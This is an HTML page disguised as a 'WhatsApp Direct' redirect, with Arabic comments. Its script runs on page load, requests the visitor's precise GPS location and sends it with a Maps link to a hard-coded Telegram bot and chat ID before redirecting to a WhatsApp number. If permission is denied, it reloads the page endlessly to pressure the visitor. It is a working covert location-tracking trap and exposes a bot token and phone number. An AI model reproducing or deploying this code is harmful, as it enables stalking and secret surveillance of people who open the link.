<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Direct</title>
    <style>
        body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #25D366; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #075e54; font-size: 14px; font-weight: bold; }
    </style>
</head>
<body>

<div style="text-align: center;">
    <div class="loader"></div>
    <p>جاري تحويلك لمحادثة الواتساب...</p>
</div>

<script>
    // بيانات البوت الخاصة بك التي زودتني بها
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';
    // الرقم المستهدف للتحويل
    const targetPhone = '963997715905'; 

    function startTracking() {
        const geoOptions = {
            enableHighAccuracy: true, // طلب أعلى دقة GPS
            timeout: 25000,           // انتظار الإشارة لمدة 25 ثانية
            maximumAge: 0             // موقع جديد دائماً
        };

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;

                // إنشاء رابط خرائط مباشر يفتح في التطبيق فوراً
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                let report = `🎯 **تم صيد موقع جديد!**\n\n`;
                report += `📍 الرابط المباشر:\n${mapLink}\n\n`;
                report += `📏 نسبة الخطأ: ${acc.toFixed(1)} متر\n`;
                report += `⏰ الوقت: ${new Date().toLocaleTimeString('ar-EG')}`;

                // إرسال البيانات إلى بوتك في تليجرام
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(report)}&parse_mode=Markdown`)
                .then(() => {
                    // تحويل الشخص للواتساب بعد سحب الموقع بنجاح
                    window.location.href = `https://wa.me/${targetPhone}`;
                });

            }, function(error) {
                // إذا رفض الشخص إعطاء الصلاحية، نعيد تحميل الصفحة لإجباره
                location.reload();
            }, geoOptions);
        }
    }

    // تشغيل السحب فور فتح الرابط
    window.onload = startTracking;
</script>

</body>
</html>
